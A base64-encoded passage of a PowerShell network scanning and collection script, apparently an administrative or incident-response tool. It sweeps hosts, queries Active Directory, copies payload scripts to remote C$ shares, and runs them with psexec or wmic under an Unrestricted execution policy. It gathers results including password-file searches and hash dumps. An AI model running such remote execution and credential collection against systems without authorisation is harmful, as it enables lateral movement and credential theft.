3IubmFtZSkuVGV4dEZpbGVQYXJzZVR5cGUgPSAxCgkJJHdvcmtzaGVldC5RdWVyeVRhYmxlcy5pdGVtKCRDb25uZWN0b3IubmFtZSkuUmVmcmVzaCgpICB8IG91dC1udWxsCgkJJHdvcmtzaGVldC5RdWVyeVRhYmxlcy5pdGVtKCRDb25uZWN0b3IubmFtZSkuZGVsZXRlKCkgIHwgb3V0LW51bGwKCgkJI0F1dG9maXQgdGhlIGNvbHVtbnMKCQkkd29ya3NoZWV0LlVzZWRSYW5nZS5FbnRpcmVDb2x1bW4uQXV0b0ZpdCgpIHwgb3V0LW51bGwKCQkKCQkjRnJlZXplIGZpcnN0IHJvdwoJCSR3b3JrU2hlZXQuQWN0aXZhdGUoKTsKCQkkd29ya1NoZWV0LkFwcGxpY2F0aW9uLkFjdGl2ZVdpbmRvdy5TcGxpdFJvdyA9IDE7CgkJJHdvcmtTaGVldC5BcHBsaWNhdGlvbi5BY3RpdmVXaW5kb3cuRnJlZXplUGFuZXMgPSAkdHJ1ZQoKCQkjQXBwbHkgYXV0b2ZpbHRlcgoJCSR3b3Jrc2hlZXQudXNlZHJhbmdlLmF1dG9maWx0ZXIoMSwgW1R5cGVdOjpNaXNzaW5nKSB8IE91dC1OdWxsCgkJCiAgICAgICAgJGkrKwoJfQoJCglzd2l0Y2goJE91dHB1dEZvcm1hdCkKCXsKCQkjRmlsZSBFeHRlbnNpb24gIi54bHNiIiAtLT4gWGxGaWxlRm9ybWF0PSA1MCAKCQkjRmlsZSBFeHRlbnNpb24iLnhsc3giICAtLT4gWGxGaWxlRm9ybWF0PSA1MQoJCSNGaWxlIEV4dGVuc2lvbiIueGxzbSIgIC0tPiBYbEZpbGVGb3JtYXQ9IDUyCgkJI0ZpbGUgRXh0ZW5zaW9uIi54bHMiICAgLS0+IFhsRmlsZUZvcm1hdD0gNTYKCQkjRmlsZSBFeHRlbnNpb24iLmNzdiIgICAtLT4gWGxGaWxlRm9ybWF0PSA2CgkJI0ZpbGUgRXh0ZW5zaW9uIi50eHQiICAgLS0+IFhsRmlsZUZvcm1hdD0gLTQxNTgKCQkjRmlsZSBFeHRlbnNpb24gIi5wcm4iICAtLT4gWGxGaWxlRm9ybWF0PSAzNgoJCSNMaW5rIGJlbG93IHNob3dzIGFsbCBmaWxlIGZvcm1hdCBvcHRpb25zCgkJI2h0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvb2ZmaWNlL2ZmMTk4MDE3LmFzcHgKCQkKCQkieGxzYiJ7CgkJCSR3b3JrYm9vay5TYXZlQXMoIiRPVVRfRElSXCR7RmlsZX0ueGxzYiIsNTApCgkJCSRvdXQgPSAiJE9VVF9ESVJcJHtGaWxlfS54bHNiIgoJCX0KCQkieGxzeCJ7CgkJCSR3b3JrYm9vay5TYXZlQXMoIiRPVVRfRElSXCR7RmlsZX0ueGxzeCIsNTEpCgkJCSRvdXQgPSAiJE9VVF9ESVJcJHtGaWxlfS54bHN4IgoJCX0KCQkieGxzInsKCQkJJHdvcmtib29rLlNhdmVBcygiJE9VVF9ESVJcJHtGaWxlfS54bHMiLDU2KQoJCQkkb3V0ID0gIiRPVVRfRElSXCR7RmlsZX0ueGxzIgoJCX0KCX0KCQoJZm9yKCRpPTA7ICRpIC1sdCAxNTsgJGkrKykgI21vdmUgQ1NWIGRhdGEgZmlsZXMgdG8gQ1NWIGZvbGRlcgoJewoJCXRyeSB7CgkJCWlmICgkU2Nhbm5lZEhvc3RzKSB7TW92ZS1JdGVtICIkVEVNUF9ESVJcJFNjYW5uZWRfSG9zdHMqLmNzdiIgIiRPVVRfRElSXENTViIgLUZvcmNlIC1FcnJvckFjdGlvbiBTdG9wfQoJCQllbHNlIHtNb3ZlLUl0ZW0gIiRURU1QX0RJUlwkT3V0RmlsZSIgIiRPVVRfRElSXENTViIgLUZvcmNlIC1FcnJvckFjdGlvbiBTdG9wfQoJCQlicmVhawoJCX0gY2F0Y2ggewoJCQlzbGVlcCAxCgkJfQoJfQoJCgkkZXhjZWwuUXVpdCgpCgkKCSNSZWxlYXNlIHByb2Nlc3NlcyBmb3IgRXhjZWwKCSRhID0gUmVsZWFzZS1SZWYoJHdvcmtzaGVldCkKCSRhID0gUmVsZWFzZS1SZWYoJHdvcmtib29rKQoJCgkjcmVtb3ZlIHRlbXAgZGlyZWN0b3J5IGZpbGVzLiBrZWVwIGxvb3BpbmcgdW50aWwgYWxsIHByb2Nlc3NlcyB1bmxvY2sgZmlsZXMKCXdoaWxlKCR0cnVlKXsKCQl0cnl7CgkJCVJlbW92ZS1JdGVtIC1SZWN1cnNlIC1Gb3JjZSAiJFRFTVBfRElSLyoiIC1FcnJvckFjdGlvbiBTdG9wCgkJCWJyZWFrCgkJfSBjYXRjaCB7c2xlZXAgM30KCX0KCQoJaWYoLW5vdCAkU2Nhbm5lZEhvc3RzKQoJewoJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBHcmVlbiAiRGF0YSBsb2NhdGVkIGF0ICRvdXQKCSIKCX0KfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMJRU5EIEZ1bmN0aW9ucyBmb3IgRGVwbG95L011bHRpLXRocmVhZGluZwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCVNUQVJUIE11bHRpLXRocmVhZGluZyBzY3JpcHQgYmxvY2tzCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpbU2NyaXB0QmxvY2tdICRHZXRDb21wdXRlcnNTQiA9IHsKCglwYXJhbSgkUkhvc3QsICRzY2FuKQoJCglGdW5jdGlvbiBWZXJpZnlJUAoJewoJCXBhcmFtKCRJUCkKCQkKCQkkT2N0ZXRzID0gJElQLnNwbGl0KCIuIikKCQlpZigkT2N0ZXRzLmNvdW50IC1uZSA0KXtSZXR1cm4gJGZhbHNlfQoJCQoJCWZvcigkaT0wOyAkaSAtbHQgNDsgJGkrKykKCQl7CgkJCSRudW0gPSBbY29udmVydF06OlRvSW50MzIoJE9jdGV0c1skaV0sIDEwKQoJCQlpZigtbm90ICgoJG51bSAtbGUgMjU1KSAtYW5kICgkbnVtIC1nZSAwKSkpewoJCQkJUmV0dXJuICRmYWxzZQoJCQl9CgkJfQoJCVJldHVybiAkdHJ1ZQoJfQoJCgkkSG9zdG5hbWUgPSAkUkhvc3Quc3BsaXQoIiwiKVswXSAjaW4gY2FzZSBmaWxlIGlzIGhvc3RuYW1lLCBvcyx2ZXJzaW9uIG51bWJlciBjc3YgZ3JhYiBvbmx5IHRoZSBob3N0bmFtZQoJCglpZihWZXJpZnlJUCAkSG9zdG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpICNJZiB0cnVlIEhvc3QgbmFtZSBpcyBhbiBJUCBhZGRyZXNzCgl7CgkJJEhvc3RJUCA9ICRIb3N0bmFtZQoJCSRIb3N0bmFtZSA9IChbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0RW50cnkoIiRIb3N0SVAiKSkuSG9zdG5hbWUuc3BsaXQoIi4iKVswXQoKCQlpZiggLW5vdCAkSG9zdG5hbWUpICNSZXZlcnNlIEROUyBmYWlsZWQKCQl7CgkJCVJldHVybiAiJEhvc3RJUCIgI1JldHVybiBJUAoJCX0KCX0KCgkkU2VhcmNoID0gTmV3LU9iamVjdCBEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcihbQURTSV0iTERBUDovLyQoJHNjYW4uRG9tYWluTmFtZSkiKQoJJFNlYXJjaC5maWx0ZXIgPSAiKCYobmFtZT0kSG9zdG5hbWUpKG9iamVjdENsYXNzPWNvbXB1dGVyKSkiCgkkSG9zdERhdGEgPSAkU2VhcmNoLkZpbmRPbmUoKQoJaWYoJEhvc3REYXRhKQoJewoJCSRIb3N0RGF0YS5HZXREaXJlY3RvcnlFbnRyeSgpfCV7CgkJCSRuYW1lPSRfLm5hbWUKCQkJJG9zPSRfLk9wZXJhdGluZ1N5c3RlbQoJCQkkdmVyPSRfLk9wZXJhdGluZ1N5c3RlbVZlcnNpb24KCQkJUmV0dXJuICIkbmFtZSwkb3MsJHZlciIgfCBTZWxlY3QtU3RyaW5nICJXaW5kb3dzIgkKCQl9Cgl9CgkKCWVsc2UgI0hvc3Qgbm90IGZvdW5kIGluIEFjdGl2ZSBEaXJlY3RvcnkuICBSZXR1cm4gSVAKCXsKCQkkSG9zdElQID0gKFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RFbnRyeSgiJEhvc3RuYW1lIikpLmFkZHJlc3NsaXN0fCV7JF8uSVBBZGRyZXNzVG9TdHJpbmd9CgkJUmV0dXJuICRIb3N0SVAKCX0KfQoKI3NjcmlwdCBibG9jayB0byBmaW5kIGFjdGl2ZSBtYWNoaW5lcwpbU2NyaXB0QmxvY2tdICRBY3RpdmVDb21wdXRlcnNfU0IgPSB7CgogICAgcGFyYW0oJFJIb3N0LCAkc2NhbikKCQogICAgJFJIb3N0IHwgJSB7CiAgICAgICAgJENvbXAgPSAkXy5zcGxpdCgiLCIpWzBdCgkJJE9TQ2FwdGlvbiA9ICRfLnNwbGl0KCIsIilbMV0KCQkkVmVyID0gJF8uc3BsaXQoIiwiKVsyXQoJCWlmKC1ub3QgJFZlcikgI0lmIHZlcnNpb24gd2FzIG5vdCBmb3VuZCB0aGVuICRDb21wIGlzIGFuIElQIGFkZHJlc3MKCQl7CgkJCSRIb3N0SVAgPSAkQ29tcAoJCQlpZihUZXN0LVBhdGggICJcXCRIb3N0SVBcYyRcIikKCQkJewoJCQkJdHJ5IHsKCQkJCQkkT1MgPSBHZXQtV21pT2JqZWN0IC1Db21wdXRlck5hbWUgJEhvc3RJUCBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0gLUVycm9yQWN0aW9uIFN0b3AKCQkJCX0gQ2F0Y2gge1JldHVybn0KCQkJCQoJCQkJJElQYWRkciA9ICRIb3N0SVAKCQkJCSRDb21wID0gJE9TLkNTTmFtZQoJCQkJJE9TQ2FwdGlvbiA9ICRPUy5jYXB0aW9uLnJlcGxhY2UoJywnLCAnJykucmVwbGFjZSgnTWljcm9zb2Z0ICcsICcnKQoJCQkJJFZlciA9ICRPUy52ZXJzaW9uCgkJCQlSZXR1cm4gJENvbXArIiwiKyRJUGFkZHIrIiwiKyRPU0NhcHRpb24rIiwiKyRWZXIKCQkJfQoJCQllbHNle1JldHVybn0gCgkJfQoJCWVsc2V7CgkJCSRJUGFkZHIgPSAoW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEVudHJ5KCIkQ29tcCIpKS5hZGRyZXNzbGlzdHwleyRfLklQQWRkcmVzc1RvU3RyaW5nfQoJCQlpZigtbm90ICRJUGFkZHIpe1JldHVybn0gI0hvc3QgbmFtZSBjYW5ub3QgYmUgcmVzb2x2ZWQKCQl9CiAgICAgICAgaWYgKFRlc3QtUGF0aCAgIlxcJENvbXBcYyRcIikKICAgICAgICB7CgkJCSRWZXIgPSAkVmVyLnN1YnN0cmluZygwLDMpCiAgICAgICAgICAgIFJldHVybiAkQ29tcCsiLCIrJElQYWRkcisiLCIrJE9TQ2FwdGlvbisiLCIrJFZlcgogICAgICAgIH0KICAgIH0KfQoKI3NjcmlwdGJsb2NrIHRvIGV4ZWN1dGUgcHNleGVjIG9uIHJlbW90ZSBob3N0cwpbU2NyaXB0QmxvY2tdICRQU0V4ZWNfU0IgPSB7CiAgICBwYXJhbSgkUkhvc3QsICRzY2FuKQoKICAgICRIb3N0TmFtZT0kUkhvc3Quc3BsaXQoIiwiKVswXQoJJEhvc3RJUD0kUkhvc3Quc3BsaXQoIiwiKVsxXQogICAgJHZlcj0kUkhvc3Quc3BsaXQoIiwiKVszXQoJCiAgICBpZigkdmVyLnNwbGl0KCIuIilbMF0gLWdlIDYpICNwb3dlcnNoZWxsIGZvciB2aXN0YSsKCXsKCQkkUmNvZGUgPSAiUFNFeGVjU2hlbGxDb2RlLnBzMSIKCQkkUFNDb2RlID0gJHNjYW4uUFMxQ29kZQoJCSRQU2V4ZWNBcmdzID0gJ2VjaG8gLiB8IHBvd2Vyc2hlbGwgJEV4UG9sID0gJChHZXQtRXhlY3V0aW9uUG9saWN5KTsgU2V0LUV4ZWN1dGlvblBvbGljeSBVbnJlc3RyaWN0ZWQ7IGM6XFBTRXhlY1NoZWxsQ29kZS5wczE7IFNldC1FeGVjdXRpb25Qb2xpY3kgJEV4UG9sJwoJCSRwcz0kdHJ1ZQoJfQogICAgZWxzZSAKCXsKCQkkUmNvZGUgPSAiUFNFeGVjU2hlbGxDb2RlLmJhdCIKCQkkUFNDb2RlID0gJHNjYW4uQkFUQ29kZQoJCSRwcz0kZmFsc2UKCX0KCQogICAgaWYgKFRlc3QtUGF0aCAiXFwkSG9zdElQXGMkXCRSY29kZSIpCgl7CiAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggIlxcJEhvc3RJUFxjJFwkUmNvZGUiIC1Gb3JjZQoJfQoJCiAgICB0cnl7CgkJJFBTQ29kZSB8IEFkZC1Db250ZW50ICJcXCRIb3N0SVBcYyRcJFJjb2RlIiAtRXJyb3JBY3Rpb24gU3RvcAogICAgfSBjYXRjaCB7CiAgICAgICAgIiQoKGdldC1kYXRlKS5Ub1N0cmluZygneXl5eS1NTU0tZGQgaGg6bW06c3MnKSksJEhvc3ROYW1lLENvcHkgZmFpbGVkIiB8IEFkZC1Db250ZW50ICIkKCRzY2FuLlRFTVBfRElSKVxFcnJvckxvZy5jc3YiCiAgICAgICAgY29udGludWUKICAgIH0gCglpZiAoJHNjYW4ucHNleGVjKQoJewoJCWlmKCRwcykKCQl7CQoJCQkkU3VjY2VzcyA9ICgmJHNjYW4ucHNleGVjIC1hY2NlcHRldWxhIC1zIC1kICJcXCRIb3N0SVAiIGNtZCAvYyAkUFNleGVjQXJncyAyPiYxfFNlbGVjdC1TdHJpbmcgInN0YXJ0ZWQgb24gJEhvc3RJUCIpCgkJfQoJCWVsc2UKCQl7ICAgIAoJCQkkU3VjY2VzcyA9ICgmJHNjYW4ucHNleGVjIC1hY2NlcHRldWxhIC1zIC1kICJcXCRIb3N0SVAiICJjOlxQU0V4ZWNTaGVsbENvZGUuYmF0IiAyPiYxfFNlbGVjdC1TdHJpbmcgInN0YXJ0ZWQgb24gJEhvc3RJUCIpCgkJfQoJCWlmKCRTdWNjZXNzKXsKCQkJUmV0dXJuICRSSG9zdAoJCX0KCX0KCWlmICgtbm90ICRTdWNjZXNzKQoJewoJCWlmKCRwcykKCQl7CQoJCQkkU3VjY2VzcyA9ICgmd21pYyAvbm9kZToiJEhvc3RJUCIgcHJvY2VzcyBjYWxsIGNyZWF0ZSAiY21kIC9jICRQU2V4ZWNBcmdzIiAyPiYxfFNlbGVjdC1TdHJpbmcgIlByb2Nlc3NJZCIpCgkJfQoJCWVsc2UKCQl7ICAgIAoJCQkkU3VjY2VzcyA9ICgmd21pYyAvbm9kZToiJEhvc3RJUCIgcHJvY2VzcyBjYWxsIGNyZWF0ZSAiY21kIC9jIGM6XFBTRXhlY1NoZWxsQ29kZS5iYXQiIDI+JjF8U2VsZWN0LVN0cmluZyAiUHJvY2Vzc0lkIikKCQl9Cgl9CglpZigkU3VjY2Vzcyl7CgkJUmV0dXJuICRSSG9zdAoJfQoJZWxzZQoJewoJCSIkKChnZXQtZGF0ZSkuVG9TdHJpbmcoJ3l5eXktTU1NLWRkIGhoOm1tOnNzJykpLCRIb3N0TmFtZSxSZW1vdGUgRXhlY3V0aW9uIGZhaWxlZCIgfCBBZGQtQ29udGVudCAiJCgkc2Nhbi5URU1QX0RJUilcRXJyb3JMb2cuY3N2IgoJCVJlbW92ZS1JdGVtIC1QYXRoICJcXCRIb3N0SVBcYyRcUFNFeGVjU2hlbGxDb2RlLioiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQoJfSAKfQoKI0pvYiB0byBraWxsIGh1bmcgcHNleGVjIHByb2Nlc3NlcyBhZnRlciAxNSBzZWNvbmRzCltTY3JpcHRCbG9ja10gJFBTZXhlY1dhdGNoZXIgPSB7CiAgICBXaGlsZSgkdHJ1ZSl7CiAgICAgICAgJFBTZXhlY1Byb2NzID0gZ2V0LXByb2Nlc3MgcHNleGVjIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgaWYoJFBTZXhlY1Byb2NzKXsKICAgICAgICAgICAgJFBTZXhlY1Byb2NzfCAlewogICAgICAgICAgICAgICAgaWYgKCRfLlN0YXJ0dGltZSAtaWx0ICQoZ2V0LWRhdGUpLkFkZFNlY29uZHMoLTMwKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklkIC1Gb3JjZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHNsZWVwIDEKICAgIH0KfQoKI3NjcmlwdCBibG9jayB0byBjb2xsZWN0IGRhdGEgZmlsZSBmcm9tIHJlbW90ZSBob3N0cwpbU2NyaXB0QmxvY2tdICRDb2xsZWN0RmlsZXNfU0IgPSB7CiAgICBwYXJhbSgkUkhvc3QsICRzY2FuKQogICAgJEhvc3ROYW1lID0gJFJIb3N0LnNwbGl0KCIsIilbMF0KCSRIb3N0SVAgPSAkUkhvc3Quc3BsaXQoIiwiKVsxXQogICAgJHZlcj0kUkhvc3Quc3BsaXQoIiwiKVszXQogICAgCglpZigkdmVyLnNwbGl0KCIuIikgLWdlIDYpeyRSY29kZSA9ICJQU0V4ZWNTaGVsbENvZGUucHMxIn0KICAgIGVsc2UgeyRSY29kZSA9ICJQU0V4ZWNTaGVsbENvZGUuYmF0In0KICAgIAoJZm9yKCRpPTA7ICRpIC1sdCAkc2Nhbi5UaW1lT3V0OyAkaSsrKSAjd2FpdCB1bnRpbCBzY2FuIGZpbmlzaGVzCiAgICB7CiAgICAgICAgaWYgKFRlc3QtUGF0aCAiXFwkSG9zdElQXGMkXCRSY29kZSIpe3NsZWVwIDF9IAogICAgICAgIGVsc2Uge2JyZWFrfQogICAgfQoJCgkjbG9nIHNjYW4gdGltZS1vdXQgZXJyb3IKCWlmKCRpIC1lcSAkc2Nhbi5UaW1lT3V0KXsiJCgoZ2V0LWRhdGUpLlRvU3RyaW5nKCd5eXl5LU1NTS1kZCBoaDptbTpzcycpKSwkSG9zdE5hbWUsU2NhbiBUaW1lZC1vdXQifCBBZGQtQ29udGVudCAiJCgkc2Nhbi5URU1QX0RJUilcRXJyb3JMb2cuY3N2In0KICAgCiAgICBpZiAoVGVzdC1QYXRoICAiXFwkSG9zdElQXGMkXCQoJHNjYW4uUmVtb3RlRGF0YUZpbGUpIikKICAgIHsgICAKICAgICAgICBmb3IoJGo9MDsgJGogLWx0ICRzY2FuLlRpbWVPdXQ7ICRqKyspCiAgICAgICAgewogICAgICAgICAgICAjd2FpdCBmb3IgZmlsZSB0byB1bmxvY2sKCQkJdHJ5IHsKCQkJCSRzY2FuLm10eC53YWl0b25lKCkgfE91dC1OdWxsCgkJCQlpZigkc2Nhbi5SZW1vdGVEYXRhRmlsZSAtZXEgImhhc2hlczM5MjEyNTI4MSIpCgkJCQl7CgkJCQkJJHNjYW4uRGF0YSA9ICgkc2Nhbi5EYXRhICsgKGdldC1jb250ZW50ICJcXCRIb3N0SVBcQyRcJCgkc2Nhbi5SZW1vdGVEYXRhRmlsZSkiKSB8IHNvcnQgLVVuaXF1ZSkgCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJQWRkLWNvbnRlbnQgLVBhdGggIiQoJHNjYW4uVEVNUF9ESVIpXG91dHB1dC50eHQiIC1WYWx1ZSAoZ2V0LWNvbnRlbnQgIlxcJEhvc3RJUFxDJFwkKCRzY2FuLlJlbW90ZURhdGFGaWxlKSIpIC1FcnJvckFjdGlvbiBTdG9wCgkJCQl9CgkJCQkkc2Nhbi5tdHguUmVsZWFzZU11dGV4KCkKCQkJCVJlbW92ZS1JdGVtIC1Gb3JjZSAiXFwkSG9zdElQXEMkXCQoJHNjYW4uUmVtb3RlRGF0YUZpbGUpIgoJCQkJYnJlYWsKCQkJfSBjYXRjaCB7CgkJCQkkc2Nhbi5tdHguUmVsZWFzZU11dGV4KCkKCQkJCXN0YXJ0LXNsZWVwIC1TZWNvbmRzIDEKCQkJfQogICAgICAgIH0KICAgIH0KCWVsc2UgeyIkKChnZXQtZGF0ZSkuVG9TdHJpbmcoJ3l5eXktTU1NLWRkIGhoOm1tOnNzJykpLCRIb3N0TmFtZSxBYnNlbnQgRGF0YS1maWxlInwgQWRkLUNvbnRlbnQgIiQoJHNjYW4uVEVNUF9ESVIpXEVycm9yTG9nLmNzdiJ9CgkKCWlmKCRqIC1lcSAkc2Nhbi5UaW1lT3V0KXsiJCgoZ2V0LWRhdGUpLlRvU3RyaW5nKCd5eXl5LU1NTS1kZCBoaDptbTpzcycpKSwkSG9zdE5hbWUsQ29sbGVjdCBUaW1lZC1vdXQifCBBZGQtQ29udGVudCAiJCgkc2Nhbi5URU1QX0RJUilcRXJyb3JMb2cuY3N2In0KfQoKW1NjcmlwdEJsb2NrXSAkTG9nZ2VkT25Vc2Vyc19TQiA9IHsKICAgIHBhcmFtKCRSSG9zdCwgJHNjYW4pCiAgICAkSG9zdE5hbWU9JFJIb3N0LnNwbGl0KCIsIilbMF0KCSRIb3N0SVA9JFJIb3N0LnNwbGl0KCIsIilbMV0KCgl0cnl7CgkJR2V0LVdtaU9iamVjdCB3aW4zMl9Db21wdXRlclN5c3RlbSAtQ29tcHV0ZXJOYW1lICRIb3N0SVAgLUVycm9yQWN0aW9uIFN0b3B8JXsKCQkJJHNjYW4ubXR4LndhaXRvbmUoKSB8T3V0LU51bGwKCQkJJF8uTmFtZSsiLCIrJF8uVXNlck5hbWV8QWRkLUNvbnRlbnQgIiQoJHNjYW4uVEVNUF9ESVIpXExvZ2dlZE9uVXNlcnMudHh0IgoJCQkkc2Nhbi5tdHguUmVsZWFzZU11dGV4KCkKCQl9Cgl9IGNhdGNoIHsKCQljb250aW51ZQoJfQp9CgpbU2NyaXB0QmxvY2tdICRQaW5nU3dlZXBTQiA9IHsKCXBhcmFtKCRSSG9zdCwgJHNjYW4pCgkKCSRwaW5nID0gcGluZyAkUkhvc3QgLW4gMXxzZWxlY3Qtc3RyaW5nICJUVEw9IgoJJHBpbmcgPSAkcGluZy50b3N0cmluZygpLnNwbGl0KCI9IilbM10KCQoJaWYoJHBpbmcpCgl7CgkJJHNjYW4ubXR4LndhaXRvbmUoKSB8T3V0LU51bGwKCQkiJFJIb3N0LCRwaW5nInxBZGQtQ29udGVudCAiJCgkc2Nhbi5URU1QX0RJUilcUGluZ1N3ZWVwLnR4dCIKCQkkc2Nhbi5tdHguUmVsZWFzZU11dGV4KCkKCX0KfQoKW1NjcmlwdEJsb2NrXSAkQ2xlYW5VcFNCID0gewoKCXBhcmFtKCRSSG9zdCwgJHNjYW4pCiAgICAkSG9zdE5hbWUgPSAkUkhvc3Quc3BsaXQoIiwiKVswXQoJJEhvc3RJUCA9ICRSSG9zdC5zcGxpdCgiLCIpWzFdCgoJJFNjcmlwdEZpbGVzID0KCSJQU0V4ZWNTaGVsbENvZGUuYmF0IiwKCSJQU0V4ZWNTaGVsbENvZGUucHMxIgkKCSREYXRhRmlsZXMgPSAKCSJVc2VyRXhlU2VhcmNoIiwKCSJVU0JfRW51bWVyYXRpb24iLAoJIkF1dG9SdW5EaXNhYmxlIiwKCSJTdGFydFVwUHJvZ3JhbXMiLAoJIlNjaGVkdWxlZFRhc2tzIiwKCSJSdW5uaW5nUHJvY3MiLAoJIkRyaXZlcnMiLAoJIlNlcnZpY2VzIiwKCSJOZXRzdGF0IiwKCSJJbnN0YWxsZWRTb2Z0d2FyZSIsCgkiTmV0d29ya1NoYXJlcyIsCgkiSG90Rml4RGF0YSIsCgkiQW50aXZpcnVzU3RhdHVzIiwKCSJMb2NhbEFjY291bnRzIiwKCSJJbWFnZUZpbGVTZWFyY2giLAoJIlZpZGVvRmlsZVNlYXJjaCIsCgkiU2NyaXB0RmlsZVNlYXJjaCIsCgkiRXhlY3V0YWJsZUZpbGVTZWFyY2giLAoJIkRhdGFGaWxlU2VhcmNoIiwKCSJQYXNzd29yZEZpbGVTZWFyY2giLAoJImhhc2hlcyIsCgkiSGFzaER1bXAiCgoJZm9yZWFjaCgkRGF0YUZpbGUgaW4gJERhdGFGaWxlcyl7CgkJaWYoVGVzdC1QYXRoICJcXCRIb3N0SVBcYyRcJHtEYXRhRmlsZX0zOTIxMjUyODEiKQoJCXsKCQkJdHJ5IHsKCQkJCVJlbW92ZS1JdGVtIC1Gb3JjZSAiXFwkSG9zdElQXGMkXCR7RGF0YUZpbGV9MzkyMTI1MjgxIiAtRXJyb3JBY3Rpb24gU3RvcAoJCQl9IGNhdGNoIHsKCQkJCSRzY2FuLm10eC53YWl0b25lKCl8b3V0LW51bGwKCQkJCSIkKChnZXQtZGF0ZSkuVG9TdHJpbmcoJ3l5eXktTU1NLWRkIGhoOm1tOnNzJykpLCRIb3N0TmFtZSxEYXRhLUZpbGUgUmVtb3ZhbCBGYWlsZWQgKCREYXRhRmlsZSkifEFkZC1Db250ZW50ICIkKCRzY2FuLk9VVF9ESVIpXENsZWFuVXBFcnJvckxvZy5jc3YiCgkJCQkkc2Nhbi5tdHguUmVsZWFzZU11dGV4KCkKCQkJfQoJCX0KCX0KCWZvcmVhY2goJFNjcmlwdEZpbGUgaW4gJFNjcmlwdEZpbGVzKXsKCQlpZihUZXN0LVBhdGggIlxcJEhvc3RJUFxjJFwkU2NyaXB0RmlsZSIpCgkJewoJCQl0cnkgewoJCQkJUmVtb3ZlLUl0ZW0gLUZvcmNlICJcXCRIb3N0SVBcYyRcJFNjcmlwdEZpbGUiIC1FcnJvckFjdGlvbiBTdG9wCgkJCX0gY2F0Y2ggewoJCQkJJHNjYW4ubXR4LndhaXRvbmUoKXxvdXQtbnVsbAoJCQkJIiQoKGdldC1kYXRlKS5Ub1N0cmluZygneXl5eS1NTU0tZGQgaGg6bW06c3MnKSksJEhvc3ROYW1lLFNjcmlwdC1GaWxlIFJlbW92YWwgRmFpbGVkICgkU2NyaXB0RmlsZSkifEFkZC1Db250ZW50ICIkKCRzY2FuLk9VVF9ESVIpXENsZWFuVXBFcnJvckxvZy5jc3YiCgkJCQkkc2Nhbi5tdHguUmVsZWFzZU11dGV4KCkKCQkJfQoJCX0KCX0KfQoKI2hhc2ggdGFibGUgdG8gc3RvcmUgdmFyaWFibGVzIHVzZWQgaW4gc2NhbiBhbmQgcGFzc2VkIHRvIHNjcmlwdCBibG9ja3MKJHNjYW4gPSBAewoJIlRFTVBfRElSIj0gJG51bGwKCSJPVVRfRElSIj0gJG51bGwKCSJSZW1vdGVEYXRhRmlsZSI9ICRudWxsCgkiQkFUQ29kZSI9ICRudWxsCgkiUFMxQ29kZSI9ICRudWxsCgkiVGhyb3R0bGUiPSAkbnVsbAoJIlRpbWVvdXQiID0gJG51bGwKCSJDcmVkcyI9ICRudWxsCgkicHNleGVjIj0gJG51bGwKCSJtdHgiPSRudWxsCgkiRG9tYWluTmFtZSIgPSAkbnVsbAoJIkRhdGEiID0gJG51bGwKfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwlFTkQgTXVsdGktdGhyZWFkaW5nIHNjcmlwdCBibG9ja3MKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyMjCVNUQVJUIEluaXRpYWxpemUgVmFyaWFibGVzICAgICAgIyMjIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKI1NUQVJUIFNjcmlwdCBCbG9ja3MgZm9yIERlcGxveWFibGUgcGF5bG9hZHMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKJFVzZXJFeGVTZWFyY2hDb2RlX0JBVDEgPSBAJwpAZWNobyBvZmYKSUYgRVhJU1QgIkM6XFVzZXJFeGVTZWFyY2gzOTIxMjUyODEiIERFTCAiQzpcVXNlckV4ZVNlYXJjaDM5MjEyNTI4MSIKZm9yIC9SICJjOlxkb2N1bWVudHMgYW5kIHNldHRpbmdzIiAlJWYgaW4gKCouZXhlKSBkbyBlY2hvICVDT01QVVRFUk5BTUUlLCUlfm54ZiwlJX5kcGYgPj4gIkM6XFVzZXJFeGVTZWFyY2gzOTIxMjUyODEiCihnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCIKJ0AKJFVzZXJFeGVTZWFyY2hDb2RlX1BTMSA9IEAnCmlmIChUZXN0LVBhdGggIkM6XFVzZXJFeGVTZWFyY2gzOTIxMjUyODEiKXtSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFVzZXJFeGVTZWFyY2gzOTIxMjUyODEifQpnY2kgLVJlY3Vyc2UgLUZvcmNlICJjOlxVc2VycyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg